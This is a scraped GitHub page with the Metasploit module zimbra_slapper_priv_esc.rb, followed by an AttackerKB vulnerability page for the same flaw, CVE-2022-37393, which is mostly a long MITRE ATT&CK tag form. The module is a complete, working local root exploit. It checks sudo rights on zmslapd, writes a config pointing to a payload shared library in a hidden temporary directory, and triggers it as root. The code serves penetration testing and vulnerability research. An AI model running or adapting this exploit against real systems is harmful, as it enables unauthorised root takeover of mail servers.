=== Content from github.com_50c85c8a_20250115_111908.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fblob%2Fmaster%2Fmodules%2Fexploits%2Flinux%2Flocal%2Fzimbra_slapper_priv_esc.rb)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fblob%2Fmaster%2Fmodules%2Fexploits%2Flinux%2Flocal%2Fzimbra_slapper_priv_esc.rb)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=rapid7%2Fmetasploit-framework)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[rapid7](/rapid7)
/
**[metasploit-framework](/rapid7/metasploit-framework)**
Public

* [Notifications](/login?return_to=%2Frapid7%2Fmetasploit-framework) You must be signed in to change notification settings
* [Fork
  14.1k](/login?return_to=%2Frapid7%2Fmetasploit-framework)
* [Star
   34.6k](/login?return_to=%2Frapid7%2Fmetasploit-framework)

* [Code](/rapid7/metasploit-framework)
* [Issues
  410](/rapid7/metasploit-framework/issues)
* [Pull requests
  42](/rapid7/metasploit-framework/pulls)
* [Discussions](/rapid7/metasploit-framework/discussions)
* [Actions](/rapid7/metasploit-framework/actions)
* [Projects
  1](/rapid7/metasploit-framework/projects)
* [Wiki](/rapid7/metasploit-framework/wiki)
* [Security](/rapid7/metasploit-framework/security)
* [Insights](/rapid7/metasploit-framework/pulse)

Additional navigation options

* [Code](/rapid7/metasploit-framework)
* [Issues](/rapid7/metasploit-framework/issues)
* [Pull requests](/rapid7/metasploit-framework/pulls)
* [Discussions](/rapid7/metasploit-framework/discussions)
* [Actions](/rapid7/metasploit-framework/actions)
* [Projects](/rapid7/metasploit-framework/projects)
* [Wiki](/rapid7/metasploit-framework/wiki)
* [Security](/rapid7/metasploit-framework/security)
* [Insights](/rapid7/metasploit-framework/pulse)

## Files

 master
## Breadcrumbs

1. [metasploit-framework](/rapid7/metasploit-framework/tree/master)
2. /[modules](/rapid7/metasploit-framework/tree/master/modules)
3. /[exploits](/rapid7/metasploit-framework/tree/master/modules/exploits)
4. /[linux](/rapid7/metasploit-framework/tree/master/modules/exploits/linux)
5. /[local](/rapid7/metasploit-framework/tree/master/modules/exploits/linux/local)
/
# zimbra\_slapper\_priv\_esc.rb

Copy path Blame  Blame
## Latest commit

## History

[History](/rapid7/metasploit-framework/commits/master/modules/exploits/linux/local/zimbra_slapper_priv_esc.rb)138 lines (120 loc) · 4.78 KB master
## Breadcrumbs

1. [metasploit-framework](/rapid7/metasploit-framework/tree/master)
2. /[modules](/rapid7/metasploit-framework/tree/master/modules)
3. /[exploits](/rapid7/metasploit-framework/tree/master/modules/exploits)
4. /[linux](/rapid7/metasploit-framework/tree/master/modules/exploits/linux)
5. /[local](/rapid7/metasploit-framework/tree/master/modules/exploits/linux/local)
/
# zimbra\_slapper\_priv\_esc.rb

Top
## File metadata and controls

* Code
* Blame

138 lines (120 loc) · 4.78 KB[Raw](https://github.com/rapid7/metasploit-framework/raw/refs/heads/master/modules/exploits/linux/local/zimbra_slapper_priv_esc.rb)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##
class MetasploitModule < Msf::Exploit::Local Rank = ExcellentRanking
 prepend Msf::Exploit::Remote::AutoCheck include Msf::Post::Linux::Priv include Msf::Post::Linux::System include Msf::Post::Linux::Compile include Msf::Post::Linux::Kernel include Msf::Post::File include Msf::Exploit::EXE include Msf::Exploit::FileDropper
 def initialize(info = {}) super( update\_info( info, 'Name' => 'Zimbra zmslapd arbitrary module load', 'Description' => %q{ This module exploits CVE-2022-37393, which is a vulnerability in Zimbra's sudo configuration that permits the zimbra user to execute the zmslapd binary as root with arbitrary parameters. As part of its intended functionality, zmslapd can load a user-defined configuration file, which includes plugins in the form of .so files, which also execute as root. }, 'License' => MSF\_LICENSE, 'Author' => [ 'Darren Martyn', # discovery and poc 'Ron Bowes', # Module ], 'DisclosureDate' => '2021-10-27', 'Platform' => [ 'linux' ], 'Arch' => [ ARCH\_X86, ARCH\_X64 ], 'SessionTypes' => [ 'shell', 'meterpreter' ], 'Privileged' => true, 'References' => [ [ 'CVE', '2022-37393' ], [ 'URL', 'https://web.archive.org/web/20221002011602/https://darrenmartyn.ie/2021/10/27/zimbra-zmslapd-local-root-exploit/' ], ], 'Targets' => [ [ 'Auto', {} ], ], 'DefaultTarget' => 0, 'Notes' => { 'Reliability' => [ REPEATABLE\_SESSION ], 'Stability' => [ CRASH\_SAFE ], 'SideEffects' => [ IOC\_IN\_LOGS ] } ) ) register\_options [ OptString.new('SUDO\_PATH', [ true, 'Path to sudo executable', 'sudo' ]), OptString.new('ZIMBRA\_BASE', [ true, "Zimbra's installation directory", '/opt/zimbra' ]), ] register\_advanced\_options [ OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ]) ] end
 # Because this isn't patched, I can't say with 100% certainty that this will # detect a future patch (it depends on how they patch it) def check # Sanity check if is\_root? fail\_with(Failure::None, 'Session already has root privileges') end
 unless file\_exist?("#{datastore['ZIMBRA\_BASE']}/libexec/zmslapd") print\_error("zmslapd executable not detected: #{datastore['ZIMBRA\_BASE']}/libexec/zmslapd (set ZIMBRA\_BASE if Zimbra is installed in an unusual location)") return CheckCode::Safe end
 unless command\_exists?(datastore['SUDO\_PATH']) print\_error("Could not find sudo: #{datastore['SUDOPATH']} (set SUDO\_PATH if sudo isn't in $PATH)") return CheckCode::Safe end
 # Run `sudo -n -l` to make sure we have access to the target command cmd = "#{datastore['SUDO\_PATH']} -n -l" print\_status "Executing: #{cmd}" output = cmd\_exec(cmd).to\_s
 if !output || output.start\_with?('usage:') || output.include?('illegal option') || output.include?('a password is required') print\_error('Current user could not execute sudo -l') return CheckCode::Safe end
 if !output.include?("(root) NOPASSWD: #{datastore['ZIMBRA\_BASE']}/libexec/zmslapd") print\_error('Current user does not have access to run zmslapd') return CheckCode::Safe end
 CheckCode::Appears end
 def exploit base\_dir = datastore['WritableDir'].to\_s unless writable?(base\_dir) fail\_with(Failure::BadConfig, "#{base\_dir} is not writable") end
 # Generate a random directory exploit\_dir = "#{base\_dir}/.#{rand\_text\_alphanumeric(5..10)}" if file\_exist?(exploit\_dir) fail\_with(Failure::BadConfig, 'Exploit dir already exists') end
 # Create the directory and get ready to remove it print\_status("Creating exploit directory: #{exploit\_dir}") mkdir(exploit\_dir) register\_dir\_for\_cleanup(exploit\_dir)
 # Generate some filenames library\_name = ".#{rand\_text\_alphanumeric(5..10)}.so" library\_path = "#{exploit\_dir}/#{library\_name}" config\_name = ".#{rand\_text\_alphanumeric(5..10)}" config\_path = "#{exploit\_dir}/#{config\_name}"
 # Create the .conf file config = "modulepath #{exploit\_dir}\nmoduleload #{library\_name}\n" write\_file(config\_path, config)
 write\_file(library\_path, generate\_payload\_dll)
 cmd = "sudo #{datastore['ZIMBRA\_BASE']}/libexec/zmslapd -u root -g root -f #{config\_path}" print\_status "Attempting to trigger payload: #{cmd}" out = cmd\_exec(cmd)
 unless session\_created? print\_error("Failed to create session! Cmd output = #{out}") end endend

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from attackerkb.com_379f839a_20250114_181122.html ===


[![](/static/public/img/logo-condensed-dark.png)
![](/static/public/img/logo-dark.png)
A Rapid7 Project](/)

* [Activity Feed](/activity-feed)
* [Topics](/topics)
* [About](/about)
* [Leaderboard](/leaderboard)

[Log In](/login)

![](/static/private/img/attacker-value/dark/attacker-value-5.svg)

Attacker Value
##### Very High

3

### CVE-2022-37393

3

## CVE ID

AttackerKB requires a CVE ID in order to pull vulnerability data and references from the [CVE list](https://cve.mitre.org)
and the [National Vulnerability Database](https://nvd.nist.gov). If available, please supply below:

CVE ID:

## Add References:

##### Advisory

Description:
URL:

Add Another

##### Exploit

Description:
URL:

Add Another

##### Mitigation

Description:
URL:

Add Another

##### Related AttackerKB Topic

Description:
URL:

Add Another

##### Government or Industry Alert

Description:
URL:

Add Another

##### Miscellaneous

Description:
URL:

Add Another

Cancel
Submit

![](/static/private/img/attacker-value/dark/attacker-value-5.svg)

Attacker Value
###### Very High

(1 user assessed)

![](/static/private/img/attacker-value/dark/attacker-value-2.svg)

Exploitability
###### Low

(1 user assessed)

User Interaction
###### [None](/search?userInteraction=NONE)

Privileges Required
###### [Low](/search?privilegesRequired=LOW)

Attack Vector
###### [Local](/search?attackVector=LOCAL)

3

# CVE-2022-37393

Disclosure Date: August 16, 2022
•
(Last updated October 08, 2023) ▾

[CVE-2022-37393](/search?q=CVE-2022-37393)
CVSS v3 Base Score:
7.8

Exploited in the Wild

Reported by [gwillcox-r7](/contributors/gwillcox-r7)

[View Source Details](#exploited-in-the-wild)

Report As Exploited in the Wild

MITRE ATT&CK[Log in to add MITRE ATT&CK tag](/login)
Add MITRE ATT&CK tactics and techniques that apply to this CVE.

### MITRE ATT&CK

Select the MITRE ATT&CK Tactics that apply to this CVE

Initial AccessExecutionPersistencePrivilege EscalationDefense EvasionCredential AccessDiscoveryLateral MovementCollectionExfiltrationCommand and ControlImpact

##### Collection

Select any Techniques used:

Data from Local System

Data from Removable Media

Data from Network Shared Drive

Input Capture

Input Capture: Keylogging

Input Capture: GUI Input Capture

Input Capture: Web Portal Capture

Input Capture: Credential API Hooking

Data Staged

Data Staged: Local Data Staging

Data Staged: Remote Data Staging

Screen Capture

Email Collection

Email Collection: Local Email Collection

Email Collection: Remote Email Collection

Email Collection: Email Forwarding Rule

Clipboard Data

Automated Collection

Audio Capture

Video Capture

Man in the Browser

Data from Information Repositories

Data from Information Repositories: Confluence

Data from Information Repositories: Sharepoint

Data from Cloud Storage Object

Man-in-the-Middle

Man-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay

Archive Collected Data

Archive Collected Data: Archive via Utility

Archive Collected Data: Archive via Library

Archive Collected Data: Archive via Custom Method

##### Command and Control

Select any Techniques used:

Data Obfuscation

Data Obfuscation: Junk Data

Data Obfuscation: Steganography

Data Obfuscation: Protocol Impersonation

Fallback Channels

Application Layer Protocol

Application Layer Protocol: Web Protocols

Application Layer Protocol: File Transfer Protocols

Application Layer Protocol: Mail Protocols

Application Layer Protocol: DNS

Proxy

Proxy: Internal Proxy

Proxy: External Proxy

Proxy: Multi-hop Proxy

Proxy: Domain Fronting

Communication Through Removable Media

Non-Application Layer Protocol

Web Service

Web Service: Dead Drop Resolver

Web Service: Bidirectional Communication

Web Service: One-Way Communication

Multi-Stage Channels

Ingress Tool Transfer

Data Encoding

Data Encoding: Standard Encoding

Data Encoding: Non-Standard Encoding

Traffic Signaling

Traffic Signaling: Port Knocking

Remote Access Software

Dynamic Resolution

Dynamic Resolution: Fast Flux DNS

Dynamic Resolution: Domain Generation Algorithms

Dynamic Resolution: DNS Calculation

Non-Standard Port

Protocol Tunneling

Encrypted Channel

Encrypted Channel: Symmetric Cryptography

Encrypted Channel: Asymmetric Cryptography

##### Credential Access

Select any Techniques used:

OS Credential Dumping

OS Credential Dumping: LSASS Memory

OS Credential Dumping: Security Account Manager

OS Credential Dumping: NTDS

OS Credential Dumping: LSA Secrets

OS Credential Dumping: Cached Domain Credentials

OS Credential Dumping: DCSync

OS Credential Dumping: Proc Filesystem

OS Credential Dumping: /etc/passwd and /etc/shadow

Network Sniffing

Input Capture

Input Capture: Keylogging

Input Capture: GUI Input Capture

Input Capture: Web Portal Capture

Input Capture: Credential API Hooking

Brute Force

Brute Force: Password Guessing

Brute Force: Password Cracking

Brute Force: Password Spraying

Brute Force: Credential Stuffing

Two-Factor Authentication Interception

Forced Authentication

Exploitation for Credential Access

Steal Application Access Token

Steal Web Session Cookie

Unsecured Credentials

Unsecured Credentials: Credentials In Files

Unsecured Credentials: Credentials in Registry

Unsecured Credentials: Bash History

Unsecured Credentials: Private Keys

Unsecured Credentials: Cloud Instance Metadata API

Unsecured Credentials: Group Policy Preferences

Credentials from Password Stores

Credentials from Password Stores: Keychain

Credentials from Password Stores: Securityd Memory

Credentials from Password Stores: Credentials from Web Browsers

Modify Authentication Process

Modify Authentication Process: Domain Controller Authentication

Modify Authentication Process: Password Filter DLL

Modify Authentication Process: Pluggable Authentication Modules

Man-in-the-Middle

Man-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay

Steal or Forge Kerberos Tickets

Steal or Forge Kerberos Tickets: Golden Ticket

Steal or Forge Kerberos Tickets: Silver Ticket

Steal or Forge Kerberos Tickets: Kerberoasting

##### Defense Evasion

Select any Techniques used:

Direct Volume Access

Rootkit

Obfuscated Files or Information

Obfuscated Files or Information: Binary Padding

Obfuscated Files or Information: Software Packing

Obfuscated Files or Information: Steganography

Obfuscated Files or Information: Compile After Delivery

Obfuscated Files or Information: Indicator Removal from Tools

Masquerading

Masquerading: Invalid Code Signature

Masquerading: Right-to-Left Override

Masquerading: Rename System Utilities

Masquerading: Masquerade Task or Service

Masquerading: Match Legitimate Name or Location

Masquerading: Space after Filename

Process Injection

Process Injection: Dynamic-link Library Injection

Process Injection: Portable Executable Injection

Process Injection: Thread Execution Hijacking

Process Injection: Asynchronous Procedure Call

Process Injection: Thread Local Storage

Process Injection: Ptrace System Calls

Process Injection: Proc Memory

Process Injection: Extra Window Memory Injection

Process Injection: Process Hollowing

Process Injection: Process Doppelgänging

Process Injection: VDSO Hijacking

Indicator Removal on Host

Indicator Removal on Host: Clear Windows Event Logs

Indicator Removal on Host: Clear Linux or Mac System Logs

Indicator Removal on Host: Clear Command History

Indicator Removal on Host: File Deletion

Indicator Removal on Host: Network Share Connection Removal

Indicator Removal on Host: Timestomp

Valid Accounts

Valid Accounts: Default Accounts

Valid Accounts: Domain Accounts

Valid Accounts: Local Accounts

Valid Accounts: Cloud Accounts

Modify Registry

Trusted Developer Utilities Proxy Execution

Trusted Developer Utilities Proxy Execution: MSBuild

Access Token Manipulation

Access Token Manipulation: Token Impersonation/Theft

Access Token Manipulation: Create Process with Token

Access Token Manipulation: Make and Impersonate Token

Access Token Manipulation: Parent PID Spoofing

Access Token Manipulation: SID-History Injection

Deobfuscate/Decode Files or Information

BITS Jobs

Indirect Command Execution

Traffic Signaling

Traffic Signaling: Port Knocking

Rogue Domain Controller

Exploitation for Defense Evasion

Signed Script Proxy Execution

Signed Script Proxy Execution: PubPrn

Signed Binary Proxy Execution

Signed Binary Proxy Execution: Compiled HTML File

Signed Binary Proxy Execution: Control Panel

Signed Binary Proxy Execution: CMSTP

Signed Binary Proxy Execution: InstallUtil

Signed Binary Proxy Execution: Mshta

Signed Binary Proxy Execution: Msiexec

Signed Binary Proxy Execution: Odbcconf

Signed Binary Proxy Execution: Regsvcs/Regasm

Signed Binary Proxy Execution: Regsvr32

Signed Binary Proxy Execution: Rundll32

XSL Script Processing

Template Injection

File and Directory Permissions Modification

File and Directory Permissions Modification: Windows File and Directory Permissions Modification

File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification

Execution Guardrails

Execution Guardrails: Environmental Keying

Group Policy Modification

Virtualization/Sandbox Evasion

Virtualization/Sandbox Evasion: System Checks

Virtualization/Sandbox Evasion: User Activity Based Checks

Virtualization/Sandbox Evasion: Time Based Evasion

Unused/Unsupported Cloud Regions

Pre-OS Boot

Pre-OS Boot: System Firmware

Pre-OS Boot: Component Firmware

Pre-OS Boot: Bootkit

Abuse Elevation Control Mechanism

Abuse Elevation Control Mechanism: Setuid and Setgid

Abuse Elevation Control Mechanism: Bypass User Access Control

Abuse Elevation Control Mechanism: Sudo and Sudo Caching

Abuse Elevation Control Mechanism: Elevated Execution with Prompt

Use Alternate Authentication Material

Use Alternate Authentication Material: Application Access Token

Use Alternate Authentication Material: Pass the Hash

Use Alternate Authentication Material: Pass the Ticket

Use Alternate Authentication Material: Web Session Cookie

Subvert Trust Controls

Subvert Trust Controls: Gatekeeper Bypass

Subvert Trust Controls: Code Signing

Subvert Trust Controls: SIP and Trust Provider Hijacking

Subvert Trust Controls: Install Root Certificate

Modify Authentication Process

Modify Authentication Process: Domain Controller Authentication

Modify Authentication Process: Password Filter DLL

Modify Authentication Process: Pluggable Authentication Modules

Impair Defenses

Impair Defenses: Disable or Modify Tools

Impair Defenses: Disable Windows Event Logging

Impair Defenses: HISTCONTROL

Impair Defenses: Disable or Modify System Firewall

Impair Defenses: Indicator Blocking

Impair Defenses: Disable or Modify Cloud Firewall

Hide Artifacts

Hide Artifacts: Hidden Files and Directories

Hide Artifacts: Hidden Users

Hide Artifacts: Hidden Window

Hide Artifacts: NTFS File Attributes

Hide Artifacts: Hidden File System

Hide Artifacts: Run Virtual Instance

Hijack Execution Flow

Hijack Execution Flow: DLL Search Order Hijacking

Hijack Execution Flow: DLL Side-Loading

Hijack Execution Flow: Dylib Hijacking

Hijack Execution Flow: Executable Installer File Permissions Weakness

Hijack Execution Flow: LD\_PRELOAD

Hijack Execution Flow: Path Interception by PATH Environment Variable

Hijack Execution Flow: Path Interception by Search Order Hijacking

Hijack Execution Flow: Path Interception by Unquoted Path

Hijack Execution Flow: Services File Permissions Weakness

Hijack Execution Flow: Services Registry Permissions Weakness

Hijack Execution Flow: COR\_PROFILER

Modify Cloud Compute Infrastructure

Modify Cloud Compute Infrastructure: Create Snapshot

Modify Cloud Compute Infrastructure: Create Cloud Instance

Modify Cloud Compute Infrastructure: Delete Cloud Instance

Modify Cloud Compute Infrastructure: Revert Cloud Instance

##### Discovery

Select any Techniques used:

System Service Discovery

Application Window Discovery

Query Registry

System Network Configuration Discovery

Remote System Discovery

System Owner/User Discovery

Network Sniffing

Network Service Scanning

System Network Connections Discovery

Process Discovery

Permission Groups Discovery

Permission Groups Discovery: Local Groups

Permission Groups Discovery: Domain Groups

Permission Groups Discovery: Cloud Groups

System Information Discovery

File and Directory Discovery

Account Discovery

Account Discovery: Local Account

Account Discovery: Domain Account

Account Discovery: Email Account

Account Discovery: Cloud Account

Peripheral Device Discovery

System Time Discovery

Network Share Discovery

Password Policy Discovery

Browser Bookmark Discovery

Domain Trust Discovery

Virtualization/Sandbox Evasion

Virtualization/Sandbox Evasion: System Checks

Virtualization/Sandbox Evasion: User Activity Based Checks

Virtualization/Sandbox Evasion: Time Based Evasion

Software Discovery

Software Discovery: Security Software Discovery

Cloud Service Discovery

Cloud Service Dashboard

##### Execution

Select any Techniques used:

Windows Management Instrumentation

Scheduled Task/Job

Scheduled Task/Job: At (Linux)

Scheduled Task/Job: At (Windows)

Scheduled Task/Job: Cron

Scheduled Task/Job: Launchd

Scheduled Task/Job: Scheduled Task

Command and Scripting Interpreter

Command and Scripting Interpreter: PowerShell

Command and Scripting Interpreter: AppleScript

Command and Scripting Interpreter: Windows Command Shell

Command and Scripting Interpreter: Unix Shell

Command and Scripting Interpreter: Visual Basic

Command and Scripting Interpreter: Python

Command and Scripting Interpreter: JavaScript/JScript

Software Deployment Tools

Native API

Shared Modules

Exploitation for Client Execution

User Execution

User Execution: Malicious Link

User Execution: Malicious File

Inter-Process Communication

Inter-Process Communication: Component Object Model

Inter-Process Communication: Dynamic Data Exchange

System Services

System Services: Launchctl

System Services: Service Execution

##### Exfiltration

Select any Techniques used:

Exfiltration Over Other Network Medium

Exfiltration Over Other Network Medium: Exfiltration Over Bluetooth

Automated Exfiltration

Scheduled Transfer

Data Transfer Size Limits

Exfiltration Over C2 Channel

Exfiltration Over Alternative Protocol

Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol

Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol

Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol

Exfiltration Over Physical Medium

Exfiltration Over Physical Medium: Exfiltration over USB

Transfer Data to Cloud Account

Exfiltration Over Web Service

Exfiltration Over Web Service: Exfiltration to Code Repository

Exfiltration Over Web Service: Exfiltration to Cloud Storage

##### Impact

Select any Techniques used:

Data Destruction

Data Encrypted for Impact

Service Stop

Inhibit System Recovery

Defacement

Defacement: Internal Defacement

Defacement: External Defacement

Firmware Corruption

Resource Hijacking

Network Denial of Service

Network Denial of Service: Direct Network Flood

Network Denial of Service: Reflection Amplification

Endpoint Denial of Service

Endpoint Denial of Service: OS Exhaustion Flood

Endpoint Denial of Service: Service Exhaustion Flood

Endpoint Denial of Service: Application Exhaustion Flood

Endpoint Denial of Service: Application or System Exploitation

System Shutdown/Reboot

Account Access Removal

Disk Wipe

Disk Wipe: Disk Content Wipe

Disk Wipe: Disk Structure Wipe

Data Manipulation

Data Manipulation: Stored Data Manipulation

Data Manipulation: Transmitted Data Manipulation

Data Manipulation: Runtime Data Manipulation

##### Initial Access

Select any Techniques used:

Valid Accounts

Valid Accounts: Default Accounts

Valid Accounts: Domain Accounts

Valid Accounts: Local Accounts

Valid Accounts: Cloud Accounts

Replication Through Removable Media

External Remote Services

Drive-by Compromise

Exploit Public-Facing Application

Supply Chain Compromise

Supply Chain Compromise: Compromise Software Dependencies and Development Tools

Supply Chain Compromise: Compromise Software Supply Chain

Supply Chain Compromise: Compromise Hardware Supply Chain

Trusted Relationship

Hardware Additions

Phishing

Phishing: Spearphishing Attachment

Phishing: Spearphishing Link

Phishing: Spearphishing via Service

##### Lateral Movement

Select any Techniques used:

Remote Services

Remote Services: Remote Desktop Protocol

Remote Services: SMB/Windows Admin Shares

Remote Services: Distributed Component Object Model

Remote Services: SSH

Remote Services: VNC

Remote Services: Windows Remote Management

Software Deployment Tools

Taint Shared Content

Replication Through Removable Media

Exploitation of Remote Services

Internal Spearphishing

Use Alternate Authentication Material

Use Alternate Authentication Material: Application Access Token

Use Alternate Authentication Material: Pass the Hash

Use Alternate Authentication Material: Pass the Ticket

Use Alternate Authentication Material: Web Session Cookie

Remote Service Session Hijacking

Remote Service Session Hijacking: SSH Hijacking

Remote Service Session Hijacking: RDP Hijacking

Lateral Tool Transfer

##### Persistence

Select any Techniques used:

Boot or Logon Initialization Scripts

Boot or Logon Initialization Scripts: Logon Script (Windows)

Boot or Logon Initialization Scripts: Logon Script (Mac)

Boot or Logon Initialization Scripts: Network Logon Script

Boot or Logon Initialization Scripts: Rc.common

Boot or Logon Initialization Scripts: Startup Items

Scheduled Task/Job

Scheduled Task/Job: At (Linux)

Scheduled Task/Job: At (Windows)

Scheduled Task/Job: Cron

Scheduled Task/Job: Launchd

Scheduled Task/Job: Scheduled Task

Valid Accounts

Valid Accounts: Default Accounts

Valid Accounts: Domain Accounts

Valid Accounts: Local Accounts

Valid Accounts: Cloud Accounts

Account Manipulation

Account Manipulation: Additional Azure Service Principal Credentials

Account Manipulation: Exchange Email Delegate Permissions

Account Manipulation: Add Office 365 Global Administrator Role

Account Manipulation: SSH Authorized Keys

External Remote Services

Create Account

Create Account: Local Account

Create Account: Domain Account

Create Account: Cloud Account

Office Application Startup

Office Application Startup: Office Template Macros

Office Application Startup: Office Test

Office Application Startup: Outlook Forms

Office Application Startup: Outlook Home Page

Office Application Startup: Outlook Rules

Office Application Startup: Add-ins

Browser Extensions

BITS Jobs

Traffic Signaling

Traffic Signaling: Port Knocking

Server Software Component

Server Software Component: SQL Stored Procedures

Server Software Component: Transport Agent

Server Software Component: Web Shell

Implant Container Image

Pre-OS Boot

Pre-OS Boot: System Firmware

Pre-OS Boot: Component Firmware

Pre-OS Boot: Bootkit

Create or Modify System Process

Create or Modify System Process: Launch Agent

Create or Modify System Process: Systemd Service

Create or Modify System Process: Windows Service

Create or Modify System Process: Launch Daemon

Event Triggered Execution

Event Triggered Execution: Change Default File Association

Event Triggered Execution: Screensaver

Event Triggered Execution: Windows Management Instrumentation Event Subscription

Event Triggered Execution: .bash\_profile and .bashrc

Event Triggered Execution: Trap

Event Triggered Execution: LC\_LOAD\_DYLIB Addition

Event Triggered Execution: Netsh Helper DLL

Event Triggered Execution: Accessibility Features

Event Triggered Execution: AppCert DLLs

Event Triggered Execution: AppInit DLLs

Event Triggered Execution: Application Shimming

Event Triggered Execution: Image File Execution Options Injection

Event Triggered Execution: PowerShell Profile

Event Triggered Execution: Emond

Event Triggered Execution: Component Object Model Hijacking

Boot or Logon Autostart Execution

Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

Boot or Logon Autostart Execution: Authentication Package

Boot or Logon Autostart Execution: Time Providers

Boot or Logon Autostart Execution: Winlogon Helper DLL

Boot or Logon Autostart Execution: Security Support Provider

Boot or Logon Autostart Execution: Kernel Modules and Extensions

Boot or Logon Autostart Execution: Re-opened Applications

Boot or Logon Autostart Execution: LSASS Driver

Boot or Logon Autostart Execution: Shortcut Modification

Boot or Logon Autostart Execution: Port Monitors

Boot or Logon Autostart Execution: Plist Modification

Compromise Client Software Binary

Hijack Execution Flow

Hijack Execution Flow: DLL Search Order Hijacking

Hijack Execution Flow: DLL Side-Loading

Hijack Execution Flow: Dylib Hijacking

Hijack Execution Flow: Executable Installer File Permissions Weakness

Hijack Execution Flow: LD\_PRELOAD

Hijack Execution Flow: Path Interception by PATH Environment Variable

Hijack Execution Flow: Path Interception by Search Order Hijacking

Hijack Execution Flow: Path Interception by Unquoted Path

Hijack Execution Flow: Services File Permissions Weakness

Hijack Execution Flow: Services Registry Permissions Weakness

Hijack Execution Flow: COR\_PROFILER

##### Privilege Escalation

Select any Techniques used:

Boot or Logon Initialization Scripts

Boot or Logon Initialization Scripts: Logon Script (Windows)

Boot or Logon Initialization Scripts: Logon Script (Mac)

Boot or Logon Initialization Scripts: Network Logon Script

Boot or Logon Initialization Scripts: Rc.common

Boot or Logon Initialization Scripts: Startup Items

Scheduled Task/Job

Scheduled Task/Job: At (Linux)

Scheduled Task/Job: At (Windows)

Scheduled Task/Job: Cron

Scheduled Task/Job: Launchd

Scheduled Task/Job: Scheduled Task

Process Injection

Process Injection: Dynamic-link Library Injection

Process Injection: Portable Executable Injection

Process Injection: Thread Execution Hijacking

Process Injection: Asynchronous Procedure Call

Process Injection: Thread Local Storage

Process Injection: Ptrace System Calls

Process Injection: Proc Memory

Process Injection: Extra Window Memory Injection

Process Injection: Process Hollowing

Process Injection: Process Doppelgänging

Process Injection: VDSO Hijacking

Exploitation for Privilege Escalation

Valid Accounts

Valid Accounts: Default Accounts

Valid Accounts: Domain Accounts

Valid Accounts: Local Accounts

Valid Accounts: Cloud Accounts

